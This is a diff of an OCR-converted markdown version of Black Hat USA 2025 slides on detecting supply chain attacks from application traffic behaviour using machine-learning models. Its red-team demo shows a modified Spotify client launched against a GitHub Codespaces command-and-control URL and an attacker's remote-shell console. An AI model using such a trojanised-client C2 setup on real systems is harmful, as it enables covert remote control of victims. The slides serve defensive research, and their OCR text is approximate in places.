@@ -8,19 +8,24 @@ year: 2025
 source_pdf: "BlackHat_USA_2025_Slides/Colin Estep&Dagmawi Mulugeta_Your Traffic Doesn't Lie Unmasking Supply Chain Attacks via Application Behaviour.pdf"
 pages: 66
 sha256: "9f215f1b8f7f2c8c945eed5363ed6f2565e8cc39f1f3b8e242ed93e211f898b3"
-text_chars: 16837
-ocr_pages: 22
+text_chars: 14978
+ocr_pages: 13
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 85.8
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T22:52:02Z"
+converted_at: "2026-08-12T05:08:07Z"
 ---
 # Your Traffic Doesn't Lie Unmasking Supply Chain Attacks via Application Behaviour
 
 **Speakers:** Colin Estep, Dagmawi Mulugeta  
 **Conference:** Black Hat USA 2025  
 **Source:** `BlackHat_USA_2025_Slides/Colin Estep&Dagmawi Mulugeta_Your Traffic Doesn't Lie Unmasking Supply Chain Attacks via Application Behaviour.pdf` (66 pages)
+
 
 ## Slide 1
 
@@ -39,19 +44,6 @@ LinkedIn: <u>colinestep</u>
 LinkedIn: <u>dmulugeta</u>
 
 #BHUSA   @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-'£)
-black hat
-BRIEFINGS
-Talixess
-LinkedIn: colinestep LinkedIn: dmulugeta
-e*° netskope
-"Threat Labs
-#BHUSA @BlackHatEvents
-```
 
 ## Slide 3
 
@@ -220,19 +212,6 @@ xqpt5z.dagmawi.io
 
 #BHUSA   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-BRIEFINGS wf, {<a | he i -
-Software Deployed
-OX
-Box Client
-(not browser) xqpt5z.dagmawi.io
-td
-O
-t
-```
-
 ## Slide 15
 
 # Finding Malicious Traffic
@@ -285,33 +264,11 @@ Monitoring the whole environment?
 
 9 #BHUSA   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bifekhat ;
-BRIEFINGS ne
-ee asana
-OoOx
-OmniFocus “= slack
-from &® Salesforce
-Al todoist
-#BHUSA @BlackHat=vents
-```
-
 ## Slide 20
 
 # The Research
 
 #BHUSA   @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-pifeichat o
-BRIEFINGS
-The Research
-#BHUSA @BlackHatEvents
-```
 
 ## Slide 21
 
@@ -365,21 +322,16 @@ Enriched Events
 
 #BHUSA   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-'£)
-black hat as
-BRIEFINGS re =,
 Leveraging User Agent Strings
-feeur ue “Chromium";v="116", "Not)A;Brand";v="24", “Google Chrome";7v="116" »
 Sec-Ch-Ua-Mobile: 20
-Sec-Ch-Ua-Platform: "Windows"
 Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-origin
 \User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 25
@@ -528,11 +480,10 @@ single Random Forest model
 
 #BHUSA   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-blsekhat
-BRIEFINGS
 Box 4)
 Chrome -
 Cortana -
@@ -551,7 +502,6 @@ OneOutlook -
 Outlook Web Host -
 Postman -
 RT HttpStack -
-Safari -
 SkyDriveSync -
 Slack -
 w
@@ -560,7 +510,6 @@ o
 >
 w
 2
--
 Box -
 Chrome -
 Cortana -
@@ -584,7 +533,6 @@ Microsoft Outlo...
 soft Teams -
 =
 Predicted
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 35
@@ -646,13 +594,12 @@ Not Box  93 499,907 500,000
 
 #BHUSA   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bidekhat ae
 BRIEFINGS WY,
 Can it detect a threat?
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 40
@@ -691,14 +638,6 @@ Command and Control:
 
 #BHUSA   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-: Attacker Setup
-Compromised application: Command and Control:
-= Spotify’
-```
-
 ## Slide 42
 
 # Red Team: Network Trafc fi
@@ -708,20 +647,6 @@ Victim Machine
 Github Codespaces C2
 
 #BHUSA   @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-piseichat Ya. See
-BRIEFINGS Wet SS
-en, ’® SSS
-—
-Red Team: Network Traffic
-ee Spotify:
-a,
-Github Codespaces C2
-Victim Machine
-```
 
 ## Slide 43
 
@@ -735,20 +660,6 @@ Github Codespaces C2
 
 #BHUSA   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-biSekhat AN Say
-BRIEFINGS Ca = \
-- Network Traffic
-(~ >
-Spotify/125200442 OSX_ARM64/0S X 14.7.1 [arm 2] bpotify
-Ne w,
-O
-Victim Machine
-Github Codespaces C2
-```
-
 ## Slide 44
 
 # Red Team: Victim’s Machine
@@ -759,20 +670,17 @@ C2 URL
 
 #BHUSA   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat ; , >
 BRIEFINGS St,
 Red Team: Victim’s Machine
 Spotify client (modified) C2 URL
 victim >> ./spotify-client.exe -server="sdper-duper-chains
--744944gqjxp29rq-8443.app.github.dev"
 41 6
 victim >> pwd ig
 /Users/ /Downloads/hack/simplesheLll
-(victim >> vy
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 45
@@ -783,10 +691,10 @@ Victim Interaction
 
 #BHUSA   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-blackhat Aya SS
 BRIEFINGS Sy ES
 Red Team: Attacker’s Console
 Victim
@@ -799,8 +707,6 @@ pleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.117 Spotify/1.2
 -52.442 Safari/537.36) : pwd
 /Users/ /Downloads/hack/simpleshell
 enter your command (Spotify/125200442 OSX_ARM64/0S X 14.7.1 [arm 2]) :
-y
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 46
@@ -811,21 +717,19 @@ y
 
 #BHUSA   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 pis hat
-BRIEFINGS S) aw
 Blue Team: Defender’s Console
 Anomaly with 94% confidence
 Z
 11] Potential supply chain compromise found / >»
 i=8
-[ Spotify super -duper-chains-7449449qjxp29rq-8443.app.github.dev| 2824-12-11 11:00:00
 Predicted class =(negative_label (94.0%)}
 Top 3 predictions = [{'class': 'negative_label', ‘probability’: 94.0}, {‘class': 'Spotify',
 FULL predictions path = i i i
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 47
@@ -834,16 +738,14 @@ FULL predictions path = i i i
 
 #BHUSA   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 pis hat
-BRIEFINGS my
 Attacker’s Reaction
 2 % Mohanraj_ | Today at 9:19 AM 7
 = £ wowwwwwww.. thats right
-6: 6
-X y
 ```
 
 ## Slide 48
@@ -852,11 +754,10 @@ X y
 
 #BHUSA   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat | — <
-BRIEFINGS f= ? .
 avg_time_taken_ms
 sum_client_bytes
 transactions
@@ -879,8 +780,6 @@ max_time_taken_ms
 83 other features i i
 other features min_client_bytes
 0.5
-E[F(X)]
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 49
@@ -889,26 +788,16 @@ E[F(X)]
 
 #BHUSA   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-piseichat aT:
-BRIEFINGS Sle Ny
-Demo
-#BHUSA @BlackHatEvents
-```
-
 ## Slide 50
 
 ## How did we detect the anomaly in the demo?
 
 #BHUSA   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bldekhat
-BRIEFINGS
 How did
 url_entropy
 min_server_bytes
@@ -919,18 +808,15 @@ min_time_taken_ms
 avg_path_depth
 ua_entropy
 avg_domain_length
-domain_entropy f
 resp_content_types_application/json B+ u rl entro py
 p25_time_taken_ms
 robust_cv_time_interval_sec m i n_se rve r_bytes
 refered_traffic_pct
 min_client_bytes . .
 srancactions median_time_taken_ms
-domain_api.box.com Me
 p75_client_bytes key_hostname_cnt
 avg_client_bytes
 131 other features
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 51
@@ -1009,10 +895,10 @@ Notion Client
 
 #BHUSA   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pisek hat
 BRIEFINGS ae
 Bespoke Model Training
 B® Processing training data: notion_06_10_2025.har
@@ -1021,7 +907,6 @@ B® Processing training data: notion_06_10_2025.har
 @®. Step 3: Discovering applications in traffic...
 f Step 4: Training machine learning models...
 M Model saved: ./models/custom_models/notion_model.pkl
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 58
@@ -1032,11 +917,10 @@ M Model saved: ./models/custom_models/notion_model.pkl
 
 #BHUSA   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bifekhat
-BRIEFINGS
 Bespoke Model Training
 —— Model saved for Notion
 B Processing training data:] notion_06_10_2025.har
@@ -1045,7 +929,6 @@ B Processing training data:] notion_06_10_2025.har
 @®. Step 3: Discovering applications in traffic...
 r Step 4: Traini
 <M Model saved: ./models/custom_models/notion_model.pk
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 59
@@ -1058,11 +941,10 @@ We only have a Notion Model
 
 #BHUSA   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bifekhat
-BRIEFINGS
 @ Applications analyzed with custom models (1): .
 @ Notion: 7 domains analyzed, all normal behavior detected aA Notion and VSCode detected
 Wl DETECTION SUMMARY:
@@ -1076,7 +958,6 @@ Bi Visual Studio Code
 python -m beam —-train -i /path/to/training/data
 @. Supply chain compromise detection completed for 1 applications.
 @M No critical security issues detected
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 60
@@ -1087,17 +968,15 @@ python -m beam —-train -i /path/to/training/data
 
 #BHUSA   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bifekhat
-BRIEFINGS
 Applications analyzed with custom models (1):
 @ Notion: 7 domains analyzed, all normal behavior detected
 DETECTION SUMMARY:
 ®. Total domains analyzed: 7
 @ All domains showed normal behavior: 7
-BENo supply chain compromises detecteli><——— |
 Applications found but NOT analyzed (no model available) (1):
 SH Visual Studio Code
 To analyze these applications, train custom models using:
@@ -1122,16 +1001,6 @@ No critical security issues detected
 #### 1. High entropy applications
 
 #BHUSA   @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-pis hat
-BRIEFINGS wT, <=
-Challenges & future improvements
-1. High entropy applications
-#BHUSA @BlackHatEvents
-```
 
 ## Slide 63
 
